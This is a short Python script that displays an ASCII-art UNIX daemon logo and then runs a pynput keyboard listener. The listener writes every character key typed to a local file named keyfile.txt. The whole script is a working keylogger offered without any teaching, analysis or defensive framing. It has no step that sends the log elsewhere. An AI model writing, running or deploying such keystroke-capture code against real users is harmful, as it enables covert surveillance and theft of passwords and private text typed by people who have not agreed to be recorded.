from pynput import keyboard


LOGO = """
                                ,        ,
                                /(        )`
                                \ \___   / |
                                /- _  `-/  '
                               (/\/ \ \   /\\
                               / /   | `    \\
                               O O   ) /    |
                               `-^--'`<     '
                   TM         (_.)  _  )   /
|  | |\  | ~|~ \ /             `.___/`    /
|  | | \ |  |   X                `-----' /
`__| |  \| _|_ / \  <----.     __ / __   \\
                    <----|====O)))==) \) /====
                    <----'    `--' `.__,' \\
                                 |        |
                                  \       /
                             ______( (_  / \______
                           ,'  ,-----'   |        \\
                           `--{__________)        \/"""
print(LOGO)

def keyPressed(key):
    with open("keyfile.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            pass

listener = keyboard.Listener(on_press=keyPressed)
listener.start()
input()